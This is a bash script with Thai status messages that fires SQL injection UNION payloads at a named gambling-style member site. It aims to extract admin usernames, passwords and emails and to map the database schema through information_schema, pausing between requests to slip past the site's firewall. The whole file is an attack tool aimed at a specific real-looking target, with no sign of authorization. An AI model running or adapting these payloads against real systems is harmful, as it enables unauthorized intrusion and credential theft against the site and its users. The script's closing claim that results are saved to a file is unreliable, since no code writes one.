#!/bin/bash

echo "🕵️ ดึงข้อมูล Admin จริงๆ ผ่าน SQL Injection"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
INJECTION_URL="$BASE_URL/public/js/v2/app.js"

# SQL Injection payloads สำหรับดึง admin data จริงๆ
ADMIN_PAYLOADS=(
    "25.1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "25.1' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "25.1' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "25.1' UNION SELECT username,password,email FROM admins--"
    "25.1' UNION SELECT id,username,password FROM admin_users--"
    "25.1' UNION SELECT login,password,privilege FROM administrators--"
    "25.1' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--"
    "25.1' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--"
)

echo "🔍 ทดสอบ SQL Injection สำหรับดึง Admin Data จริงๆ..."
echo ""

admin_found=0
for i in "${!ADMIN_PAYLOADS[@]}"; do
    payload="${ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Payload $((i+1)): ${payload:0:60}..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        # ตรวจสอบว่ามี admin data ใน response หรือไม่
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    ✅ พบข้อมูลใน Payload $((i+1))"
            echo "    📄 Response length: ${#response} characters"
            
            # แสดงข้อมูลที่พบ
            echo "    🔍 ข้อมูลที่พบ:"
            echo "$response" | grep -i "admin\|password\|@" | head -5
            echo ""
            admin_found=1
        else
            echo "    ❌ ไม่พบข้อมูลใน Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Payload $((i+1))"
    fi
    
    # หน่วงเวลาเพื่อหลีกเลี่ยง WAF
    sleep 2
done

echo ""
echo "🗄️ ดึงข้อมูล Database Schema..."

SCHEMA_PAYLOADS=(
    "25.1' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database()--"
    "25.1' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--"
    "25.1' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='admins'--"
    "25.1' UNION SELECT table_name,column_name,null FROM information_schema.columns WHERE table_schema=database()--"
)

schema_found=0
for payload in "${SCHEMA_PAYLOADS[@]}"; do
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"users"* ]] || [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบ Database Schema"
            echo "    📄 Schema info:"
            echo "$response" | grep -i "users\|admin\|password\|email" | head -3
            schema_found=1
            break
        fi
    fi
    sleep 2
done

if [[ $schema_found -eq 0 ]]; then
    echo "    ❌ ไม่พบ Database Schema"
fi

echo ""
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin:"
echo "  🔍 Admin Data Found: $([ $admin_found -eq 1 ] && echo "✅ พบ" || echo "❌ ไม่พบ")"
echo "  🗄️ Database Schema: $([ $schema_found -eq 1 ] && echo "✅ พบ" || echo "❌ ไม่พบ")"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ response"
echo "📄 บันทึกผลลัพธ์ใน: real_admin_extraction_results.txt"